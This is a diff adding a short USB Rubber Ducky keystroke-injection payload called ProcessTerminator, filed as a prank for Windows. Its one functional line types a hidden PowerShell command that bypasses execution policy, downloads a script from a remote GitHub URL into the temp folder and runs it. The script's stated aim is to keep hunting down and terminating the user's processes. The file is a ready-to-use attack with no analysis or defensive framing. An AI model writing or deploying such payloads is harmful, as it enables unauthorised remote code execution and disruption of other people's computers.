@@ -1,0 +1,9 @@
+REM Title: ProcessTerminator
+REM Author: dsymbol
+REM Description: Hidden PowerShell script that tirelessly hunts down user processes and terminates them
+REM Target: Windows
+
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -Exec Bypass iwr https://raw.githubusercontent.com/hak5/usbrubberducky-payloads/master/payloads/library/prank/ProcessTerminator/pt.ps1 -OutFile $env:TEMP\pt.ps1; & "$env:TEMP\pt.ps1"
+ENTER
